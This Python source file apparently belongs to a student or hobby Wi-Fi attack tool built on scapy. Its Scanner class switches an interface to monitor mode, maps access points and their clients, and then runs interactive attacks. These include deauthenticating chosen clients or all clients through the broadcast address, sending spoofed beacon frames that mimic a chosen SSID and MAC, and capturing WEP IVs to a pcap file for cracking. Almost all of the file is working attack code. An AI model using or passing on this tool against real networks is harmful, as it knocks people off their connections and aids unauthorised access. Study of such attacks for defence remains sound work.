import os
from typing import Union
from scapy.all import Dot11Beacon, Dot11, sniff, Dot11WEP, PcapWriter, RandMAC
from threading import Thread
from deauth import deauth, beacon, deauth_with_beacon
from wifi import Wifi
from utils import get_current_channel, change_channel, set_channel


class Scanner:
    """
    Context manager for scanning the network
    """
    def __init__(self, interface: str, timeout):
        self.wifis: list[Wifi] = []
        self.interface = interface
        self.curr_channel: int
        self.timeout: int = timeout

    def __enter__(self):
        self.curr_channel = get_current_channel(iface=self.interface)
        os.system(f'ip link set dev {self.interface} down')
        os.system(f'iw dev {self.interface} set type monitor')
        os.system(f'ip link set dev {self.interface} up')
        # start the channel changer
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        return self

    def __exit__(self, exc_type, exc_value, exc_tb):
        os.system(f'ip link set dev {self.interface} down')
        os.system(f'iw dev {self.interface} set type managed')
        os.system(f'ip link set dev {self.interface} up')
        set_channel(self.interface, self.curr_channel)

    def scan(self, timeout: int = 0) -> None:
        """
        Scans the network for wifi networks and clients
        :param timeout: The time to scan for
        :return: None
        """

        if timeout == 0:
            timeout = self.timeout

        self.client_list: list[list[str]] = []

        def _callback(packet):
            if Dot11Beacon in packet.layers():
                wifi = self.handle_beacon(packet)
                if wifi not in self.wifis:
                    self.wifis.append(wifi)
            elif packet[Dot11]:
                self.client_list = self.handle_clients(packet, self.client_list)

        sniff(prn=_callback, iface=self.interface, timeout=timeout)

        for client in self.client_list:
            # find wifi that client communicated with
            for wifi in self.wifis:
                if wifi.BSSID == client[1]:
                    if client[0] not in wifi.clients:
                        wifi.clients.append(client[0])

    def handle_beacon(self, packet) -> Wifi:

        # get the name of it
        stats = packet[Dot11Beacon].network_stats()
        ssid = stats['ssid'].strip()
        if not ssid:
            ssid = "'Hidden SSID'"
        if ssid in self.wifis:
            return
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        try:
            dbm_signal = packet.dBm_AntSignal
        except Exception:
            dbm_signal = "N/A"
        # get the channel of the AP
        channel = stats["channel"]
        # get the crypto
        crypto = stats["crypto"]
        try:
            country = stats['country']
        except KeyError:
            country = ""
        max_rate = stats['rates'][-1]
        beacon_interval: int = packet[Dot11Beacon].fields['beacon_interval']

        return Wifi(ssid, bssid, dbm_signal, channel, crypto, country, max_rate, beacon_interval)

    def test(self):
        def _callback(packet):
            stats = packet[Dot11Beacon].network_stats()
            print(stats)
            print(stats['country'])

        sniff(prn=_callback, iface=self.interface, timeout=self.timeout, count=4)

    def handle_clients(self, packet, client_list: list[list[str]]) -> list[list[str]]:
        """Function to handle the clients connected to the APs

        Args:
            packet (scapy.layers.dot11.Dot11): The packet sniffed
            client_list (list): The list of clients

        Returns:
            list: The list of clients
        """

        wifis_list_of_bssid = [wifi.BSSID for wifi in self.wifis]
        if self.from_client(packet):
            # extract the MAC address of the client
            src_BSSID = packet[Dot11].addr2
            if packet[Dot11].addr1 in wifis_list_of_bssid:
                client_list.append([src_BSSID, packet[Dot11].addr1])
        else:
            # extract the MAC address of the Client
            dst_BSSID = packet[Dot11].addr1
            # check if source address is as specified
            if packet[Dot11].addr2 in wifis_list_of_bssid:
                client_list.append([dst_BSSID, packet[Dot11].addr2])
        return client_list

    def from_client(self, packet) -> bool:
        """Function to check whether the packet is sent from client or AP"""

        DS = packet.FCfield & 0x3
        to_ds = DS & 0x1 != 0
        from_ds = DS & 0x2 != 0

        # to_ds betyder at addr1 vil være AP, og addr2 vil være client.

        if not to_ds and from_ds:
            # Packet is sent from AP to client
            return False
        elif to_ds and not from_ds:
            # Packet is sent from client to AP
            return True
        else:
            # Invalid configuration (e.g., ad-hoc mode)
            return False

    def get_clients(self, specific_acces_point: Union[Wifi, None] = None) -> list[dict[str, list[dict[str, str]]]]:
        """Function to get all clients connected to the APs

        Returns:
            list: of dict for each AP containing a list of dictions for each client containing the MAC address and the SSID
        """
        clients = []
        if specific_acces_point:
            for wifi in self.wifis:
                if wifi.BSSID == specific_acces_point.BSSID:
                    clients.append({"SSID": wifi.SSID, "clients": wifi.get_clients()})
                    return clients
            raise ValueError("The specific acces point was not found")
        else:
            for wifi in self.wifis:
                clients.append({"SSID": wifi.SSID, "clients": wifi.get_clients()})
        return clients if clients != [] else []

    def scan_network(self) -> bool:
        """Function to print the scanned network topology for APs and clients

        Returns:
            bool: True if APs were found, False if not
        """
        print("Building topology:\n Scanning network for APs and clients...")
        self.scan()
        return self.show_aps()

    def show_aps(self) -> bool:
        # for each AP print in tabular the data associated with it and its clients
        if self.wifis:
            print("Network topology:\n")
            print("{wifi.SSID}: {wifi.BSSID} | {wifi.channel} | {wifi.crypto} | {wifi.country} | {wifi.max_bitrate} | {wifi.beacon_interval}")

            for i, wifi in enumerate(self.wifis):
                # print all the data associated with the AP
                print(f"{i}. {wifi.SSID}: {wifi.BSSID} | {wifi.channel} | {wifi.crypto} | {wifi.country} | {wifi.max_bitrate} | {wifi.beacon_interval}")

                if wifi.clients:
                    print("\tClients:")
                    for client in wifi.clients:
                        print(f"\t{client}")
                else:
                    print("\tNo clients found.")

            return True
        else:
            print("No APs found.")
            return False

    def prompt_for_ap(self) -> Wifi:
        """
        Check if we have scanned the network. If so, we can prompt user for AP to attack from scanner.wifis
        Then in scanner.wifis find the AP with the same BSSID as the one we scanned for
        Then check if we found the AP
        """
        def _get_targeted_ap() -> Wifi:
            AP_to_attack_str = input("Input AP BSSID for client scan: ")
            print("Scanning network for selected AP...")
            self.scan()
            # in scanner.wifis find the AP with the same BSSID as the one we scanned for
            for wifi in self.wifis:
                if wifi.BSSID == AP_to_attack_str:
                    target_ap = wifi
                    break
            # check if we found the AP
            if not target_ap:
                print("Could not find AP in scanned APs. Try scanning network first.")
                return False
            return target_ap

        if self.wifis:
            print("Choose AP from list: ")
            for i, wifi in enumerate(self.wifis):
                print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
            print(f"{len(self.wifis)+1}. User defined AP")
            AP_to_attack = int(input("Input index of AP to attack: "))
            if AP_to_attack == len(self.wifis) + 1:
                target_ap = _get_targeted_ap()
                return
            target_ap = self.wifis[AP_to_attack]
        else:
            print("No APs found. Try scanning network first.")
            return False
        return target_ap

    def show_clients(self) -> bool:
        target_ap = self.prompt_for_ap()
        print(f"Extracting client list for AP: {target_ap.SSID}")
        # Get clients from AP
        if target_ap.clients:
            print("Clients on AP:")
            print(target_ap.get_clients_MAC())
        else:
            print("No clients found on AP.")
            # prompt if user wants to seach for clients on AP
            search_for_clients = input("Do you want to search for clients on AP? (y/n): ").strip()
            if search_for_clients == "y":
                self.scan()
        return True

    def send_deauth(self):
        if not self.wifis:
            print("AP list is empty, please scan the network first.")
            return
        target_ap = self.prompt_for_ap()
        set_channel(self.interface, target_ap.channel)

        # Check if we have clients on the AP. If so, prompt user for client to deauth
        if target_ap.clients:
            print("Choose client to deauth from list:")
            for i, client in enumerate(target_ap.clients):
                print(f"{i}. {client}")
            print(f"{len(target_ap.clients)+1}. User defined client")
            print(f"{len(target_ap.clients)+2}. Deauth all clients")
            client_to_deauth = int(input("Input choice: "))

            if client_to_deauth == len(target_ap.clients) + 1:
                target_client = input("Input client MAC for deauth: ")
            elif client_to_deauth == len(target_ap.clients) + 2:
                target_client = "ff:ff:ff:ff:ff:ff"
            else:
                target_client = target_ap.clients[client_to_deauth]

        # If we don't have clients on the AP, prompt user for client to deauth
        else:
            target_client = input("Input client MAC for deauth: ")

        deauth(self.interface, target_ap.BSSID, target_client)

    def send_deauth_with_beacon(self):
        if not self.wifis:
            print("AP list is empty, please scan the network first.")
            return
        target_ap = self.prompt_for_ap()
        set_channel(self.interface, target_ap.channel)

        # Check if we have clients on the AP. If so, prompt user for client to deauth
        if target_ap.clients:
            print("Choose client to deauth from list:")
            for i, client in enumerate(target_ap.clients):
                print(f"{i}. {client}")
            print(f"{len(target_ap.clients)+1}. User defined client")
            print(f"{len(target_ap.clients)+2}. Deauth all clients")
            client_to_deauth = int(input("Input choice: "))

            if client_to_deauth == len(target_ap.clients) + 1:
                target_client = input("Input client MAC for deauth: ")
            elif client_to_deauth == len(target_ap.clients) + 2:
                target_client = "ff:ff:ff:ff:ff:ff"
            else:
                target_client = target_ap.clients[client_to_deauth]

        # If we don't have clients on the AP, prompt user for client to deauth
        else:
            target_client = input("Input client MAC for deauth: ")

        deauth_with_beacon(self.interface, target_ap.SSID, target_ap.BSSID, target_client)

    def send_beacon(self):
        SSID = input("Write SSID to mimic ")
        BSSID = input("Write MAC address to mimic ('0' for random MAC) ")
        if BSSID == '0':
            BSSID = str(RandMAC())
        if input("Do you want to broadcast beacon frames? (y,n) ").lower() == "n":
            client = input("Write MAC address of client to send to")
            beacon(self.interface, BSSID, SSID, client)
        else:
            beacon(self.interface, BSSID, SSID)

    def get_ivs(self):
        # Create file to save IVs to
        pktdump = PcapWriter("iv_file.cap", append=True, sync=True)

        # Filter for WEP packets
        def filter_WEP(p):
            if p.haslayer(Dot11WEP):
                print("Found WEP packet")
                pktdump.write(p)

        # For testing
        # sniff(offline="output-01.cap", prn=filter_WEP, count=int(time_for_sniff))

        # Get AP to sniff from
        target_ap = self.prompt_for_ap()
        if not target_ap.crypto == "WEP":
            print("AP is not WEP encrypted. Please choose another AP.")
            return
        set_channel(self.interface, target_ap.channel)
        time_for_sniff = input("How long do you want to capture IVs? (seconds): ")
        
        sniff(iface=self.interface, prn=filter_WEP, timeout=int(time_for_sniff))

        print(f'IVs saved to file: {pktdump.filename}')
        # os.system(f'Aircrack-ng {pktdump.filename}') Doesn't work